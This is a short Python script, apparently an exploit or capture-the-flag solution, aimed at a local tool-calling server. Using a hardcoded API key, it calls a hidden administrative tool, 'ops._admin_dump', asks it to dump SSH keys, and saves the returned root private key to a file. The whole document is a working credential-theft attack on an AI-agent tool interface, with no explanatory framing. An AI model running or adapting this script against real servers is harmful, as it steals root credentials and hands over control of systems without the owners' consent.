import requests



url = 'http://localhost:5000/tools/call'
headers= {
    "Content-Type": "application/json",
    "X-API-Key": "opsmcp_secret_key_4f5a6b7c8d9e0f1a"
}

payload= {
  "name": "ops._admin_dump",
  "arguments": {
    "target": "ssh_keys",
    "confirm": True
  }
}

res=requests.post(url=url,headers=headers,json=payload)
print(res.status_code)
data = res.json()
with open('root_key', 'w') as f:
    f.write(data['root_private_key'])

